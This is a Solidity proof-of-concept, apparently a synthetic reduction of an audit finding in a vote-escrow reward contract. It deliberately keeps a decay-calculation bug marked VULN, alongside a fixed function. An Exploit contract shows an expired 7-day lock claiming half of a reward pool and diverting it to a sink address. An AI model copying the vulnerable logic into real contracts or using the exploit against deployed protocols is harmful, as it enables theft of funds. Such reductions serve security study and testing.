// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Regnum Aurum PowerCheckpoint — maxLockDuration used as totalTime
    (Pashov, finding 66162 / C-08).
    SYNTHETIC, cheatcode-free reduction.
    getVotingPowerAtBlock passes state.lockState.maxLockDuration where the
    decay function expects the position's own lock.end - lock.start.
    A 7-day lock queried at expiry still has the same votes as a year lock
    that has only aged 7 days, and takes half of a 100-token reward.
    Vulnerable assignment preserved below (@> VULN). */

contract Token {
    string public symbol = "RWA";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PowerCheckpoint {
    uint256 public constant MAX_LOCK = 365 days;
    uint256 public constant MIN_LOCK = 7 days;
    uint256 public constant REWARD = 100e18;

    struct Lock {
        uint256 amount;
        uint256 start;
        uint256 end;
    }

    Token public token;
    mapping(address => Lock) public locks;
    address public constant HONEST = 0x000000000000000000000000000000000000bEEF;

    constructor(Token t) {
        token = t;
    }

    function lockTokens(address user, uint256 amount, uint256 duration) external {
        locks[user] = Lock({amount: amount, start: 0, end: duration});
    }

    function getVotingPowerAtBlock(address user, uint256 blockTime) public view returns (uint256) {
        Lock memory position = locks[user];
        uint256 timeElapsed = blockTime - position.start;
        uint256 totalTime = MAX_LOCK;
        return calculateExpectedBalanceAfterDecay(position.amount, totalTime, timeElapsed, MAX_LOCK); // @> VULN: totalTime is maxLockDuration, not position.end - position.start
    }

    function getVotingPowerFixed(address user, uint256 blockTime) public view returns (uint256) {
        Lock memory position = locks[user];
        uint256 timeElapsed = blockTime - position.start;
        uint256 totalTime = position.end - position.start;
        return calculateExpectedBalanceAfterDecay(position.amount, totalTime, timeElapsed, MAX_LOCK);
    }

    function calculateExpectedBalanceAfterDecay(
        uint256 amount,
        uint256 totalTime,
        uint256 timeElapsed,
        uint256 maxLockDuration
    ) public pure returns (uint256) {
        if (timeElapsed >= totalTime) return 0;
        uint256 remaining = totalTime - timeElapsed;
        return amount * remaining / maxLockDuration;
    }

    function distribute() external returns (uint256 payAttacker, uint256 payHonest) {
        uint256 when = MIN_LOCK;
        uint256 powerA = getVotingPowerAtBlock(msg.sender, when);
        uint256 powerH = getVotingPowerAtBlock(HONEST, when);
        uint256 totalPower = powerA + powerH;
        payAttacker = REWARD * powerA / totalPower;
        payHonest = REWARD - payAttacker;
        token.transfer(msg.sender, payAttacker);
        token.transfer(HONEST, payHonest);
    }
}

contract Exploit {
    Token public token; // CREATE nonce 1
    PowerCheckpoint public checkpoint; // CREATE nonce 2
    address public constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 public constant LOCK_AMOUNT = 365e18;
    uint256 public attackerPower;
    uint256 public honestPower;
    uint256 public fixedPower;
    uint256 public stolen;

    constructor() {
        token = new Token();
        checkpoint = new PowerCheckpoint(token);
    }

    function run() external {
        checkpoint.lockTokens(address(this), LOCK_AMOUNT, checkpoint.MIN_LOCK());
        checkpoint.lockTokens(checkpoint.HONEST(), LOCK_AMOUNT, checkpoint.MAX_LOCK());
        token.mint(address(checkpoint), checkpoint.REWARD());

        attackerPower = checkpoint.getVotingPowerAtBlock(address(this), checkpoint.MIN_LOCK());
        honestPower = checkpoint.getVotingPowerAtBlock(checkpoint.HONEST(), checkpoint.MIN_LOCK());
        fixedPower = checkpoint.getVotingPowerFixed(address(this), checkpoint.MIN_LOCK());

        (uint256 payAttacker,) = checkpoint.distribute();
        stolen = payAttacker;
        token.transfer(SINK, payAttacker);

        require(fixedPower == 0, "expired 7-day lock should have 0 votes");
        require(attackerPower == honestPower && attackerPower > 0, "expired lock matches a year lock");
        require(payAttacker == 50e18, "took half the reward");
        require(token.balanceOf(SINK) == 50e18, "50 RWA diverted");
    }
}
